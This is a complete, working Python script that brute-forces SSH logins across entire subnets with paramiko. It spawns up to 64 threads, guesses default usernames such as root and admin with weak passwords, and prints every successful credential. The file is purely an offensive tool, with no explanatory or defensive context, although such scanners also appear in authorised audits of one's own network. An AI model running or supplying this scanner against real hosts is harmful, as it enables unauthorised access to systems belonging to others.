#!/usr/bin/env python

# define what to look for
hlist = [ '192.168.1', '192.168.2' ]
ulist = [ 'root', 'toor', 'admin', 'administrator' ]
plist = [ 'password', 'root' ]

# more configurable options
debug = 0
maxthreads = 64

# done with configuration from here on...
import sys
import threading
import paramiko
import socket
import re

def deprint(msg):
	"""Print if debug"""
	if debug == 1:
		print(msg)
	else:
		return

def go(host, users, passwords):
	"""Try users and passwords"""
	threads.acquire()
	c = paramiko.SSHClient()
	c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	breakme = 0
	for u in users:
		if breakme == 1:
			c.close()
			break
		for p in passwords:
			try:
				c.connect(host, username=u, password=p, allow_agent=False,
							look_for_keys=False, timeout=4)
				print('%s:%s@%s: Successful authentication!' % (u, p, host))
				breakme = 1
				break
			except (socket.error,
					paramiko.BadAuthenticationType) as e:
				deprint('%s: %s' % (host, e))
				breakme = 1
				break
			except (paramiko.AuthenticationException,
					paramiko.SSHException) as e:
				deprint('%s:%s@%s: %s' % (u, p, host, e))
				c.close()
	threads.release()

# parse ip addresses and c classes
newhlist = []
for h in hlist:
	if re.match("^(\d){1,3}\.(\d){1,3}\.(\d){1,3}\.(\d){1,3}$", h):
		newhlist.append(h)
	elif re.match("^(\d){1,3}\.(\d){1,3}\.(\d){1,3}$", h):
		for i in range(1, 255):
			nw = str("%s.%i" % (h, i))
			newhlist.append(nw)

print('Using %i thread(s) to check %i host(s)' % (maxthreads, len(newhlist)))

# distribute tasks
threads = threading.BoundedSemaphore(value=maxthreads)
for h in newhlist:
	t = threading.Thread(target=go, args=(h, ulist, plist))
	t.start()

sys.exit(0)

